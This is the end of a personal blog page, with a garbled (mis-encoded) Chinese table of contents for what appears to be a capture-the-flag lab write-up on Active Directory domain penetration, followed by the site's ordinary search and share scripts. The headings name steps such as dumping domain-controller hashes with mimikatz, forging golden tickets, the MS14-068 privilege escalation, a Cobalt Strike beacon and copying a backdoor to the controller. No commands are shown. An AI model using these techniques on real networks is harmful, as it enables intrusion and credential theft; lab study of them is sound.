href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4"><span class="toc-text">è·å–åŸŸæ§æƒé™å‘½ä»¤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87"><span class="toc-text">è·å–dcåŸŸæ§å“ˆå¸Œæ˜æ–‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93%E5%9F%9F%E6%8E%A7%E5%85%A8%E9%83%A8hash"><span class="toc-text">æŠ“åŸŸæ§å…¨éƒ¨hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">åˆ¶ä½œé»„é‡‘ç¥¨æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96ntml-sid-rid"><span class="toc-text">è·å–ntml sid rid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E5%9F%9F%E6%8E%A7%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="toc-text">çªƒå–åŸŸæ§è¶…çº§ç®¡ç†æƒé™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">ç”Ÿæˆé»„é‡‘ç¥¨æ®</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">CSè¿›è¡Œå†…ç½‘åŸŸæ¸—é€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bteamserver"><span class="toc-text">å»ºç«‹teamserver</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%B8%8B%E8%BD%BDpowershell%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-text">åœ¨webæœåŠ¡å™¨ä¸Šæ‰§è¡Œä¸‹è½½powershellæ¶æ„ä»£ç </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E9%97%B4%E9%9A%94%E6%97%B6%E9%97%B4"><span class="toc-text">è®¾ç½®é—´éš”æ—¶é—´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96hash%E5%92%8C%E5%9F%9F%E5%86%85%E4%BF%A1%E4%BB%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text">è·å–hashå’ŒåŸŸå†…ä¿¡ä»»ä¸»æœº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%8E%AF%E5%A2%83%E5%86%85%E4%B8%BB%E6%9C%BA"><span class="toc-text">æ‰«æç¯å¢ƒå†…ä¸»æœº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8cs%E9%9B%86%E6%88%90%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">åˆ©ç”¨csé›†æˆå‘½ä»¤è¿›è¡Œä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-mimikatz-web%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87"><span class="toc-text">cs mimikatz webæœåŠ¡è·å–æ˜æ–‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dir%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7DC"><span class="toc-text">dirè®¿é—®åŸŸæ§DC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-ms14-068%E6%8F%90%E6%9D%83%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-text">cs ms14-068ææƒåˆ°åŸŸæ§</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8ms14-068-py%E8%84%9A%E6%9C%AC%E4%B8%8B%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-text">åœ¨ms14-068.pyè„šæœ¬ä¸‹åˆ›å»ºç¥¨æ®</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KrbCredExport-%E5%B0%86-ccache-%E6%96%87%E4%BB%B6%E8%BD%AC%E5%8C%96%E4%B8%BA-kirbi-%E6%A0%BC%E5%BC%8F"><span class="toc-text">KrbCredExport å°† .ccache æ–‡ä»¶è½¬åŒ–ä¸º kirbi æ ¼å¼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E7%A5%A8%E6%8D%AE%E8%AE%BF%E9%97%AEdc"><span class="toc-text">å¯¼å…¥ç¥¨æ®è®¿é—®dc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-text">è·å–dcåŸŸæ§æƒé™</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEsmb%E8%BF%9E%E6%8E%A5%E5%99%A8%EF%BC%8C%E8%BF%9B%E8%A1%8C%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">è®¾ç½®smbè¿æ¥å™¨ï¼Œè¿›è¡Œæ­£å‘è¿æ¥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E5%88%B0%E5%9F%9F%E6%8E%A7%E4%B8%AD%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-text">å¤åˆ¶åé—¨æ–‡ä»¶åˆ°åŸŸæ§ä¸­å¹¶æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8beacon%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E4%B8%8Adc"><span class="toc-text">åœ¨beaconæ­£å‘è¿æ¥ä¸Šdc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96dc%E6%98%8E%E6%96%87%E5%93%88%E5%B8%8C"><span class="toc-text">è·å–dcæ˜æ–‡å“ˆå¸Œ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">csåˆ¶ä½œé»„é‡‘ç¥¨æ®</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AF%BC%E5%87%BAkrbtgt%E4%BF%A1%E6%81%AF"><span class="toc-text">åœ¨åŸŸæ§ä¸Šæ‰§è¡Œå‘½ä»¤å¯¼å‡ºkrbtgtä¿¡æ¯</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8web%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-text">åœ¨webæœåŠ¡å™¨ä¸Šåˆ¶ä½œé»„é‡‘ç¥¨æ®</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FLAG%E8%8E%B7%E5%8F%96"><span class="toc-text">FLAGè·å–</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-flag1"><span class="toc-text">Web flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-flag2"><span class="toc-text">Web flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DC-flag3"><span class="toc-text">DC flag3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">å‚è€ƒ</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          
              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
                <i class="iconfont icon-github"></i>
              </a>
              
        </li>
        
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://x2nn.github.io">Copyright Â© 2024 - 2025</a>
        
    </div>
  
  
    <div class="footer-views">
      
          æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
        
      
          æœ¬æ–‡æ€»é˜…è¯»é‡<span id="busuanzi_value_page_pv"></span>æ¬¡
        
      
          æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
        
      
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer toï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2025%2F05%2F11%2F%25E6%259A%2597%25E6%259C%2588%25E9%25A1%25B9%25E7%259B%25AE%25E5%2585%25AD%25E5%2586%2585%25E7%25BD%2591%25E5%259F%259F%25E6%25B8%2597%25E9%2580%258F%25E7%25AC%2594%25E8%25AE%25B0%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
